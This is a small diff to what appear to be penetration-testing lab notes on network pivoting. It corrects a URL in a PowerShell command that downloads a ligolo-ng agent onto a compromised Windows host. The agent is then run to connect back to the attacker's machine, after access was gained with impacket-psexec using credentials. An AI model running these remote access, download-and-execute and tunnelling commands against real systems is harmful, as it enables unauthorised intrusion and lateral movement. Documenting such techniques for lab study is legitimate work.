@@ -45,7 +45,7 @@ connect to target-machine-137 to use as first hop!
 └─$ impacket-psexec domain/username:'password'@192.168.111.137
 
 # download ligolo agent onto target-machine-137
-PS C:\Windows\Temp> iwr -uri "http:/192.168.xx.xxx:port/ligolo-ng_agent_win.exe" -OutFile "agent.exe"
+PS C:\Windows\Temp> iwr -uri "http://192.168.xx.xxx:port/ligolo-ng_agent_win.exe" -OutFile "agent.exe"
 
 PS C:\Windows\Temp> ./agent.exe -connect 192.168.xx.xxx:11601 -ignore-cert
 time="time-shown-here" level=warning msg="warning, certificate validation disabled"
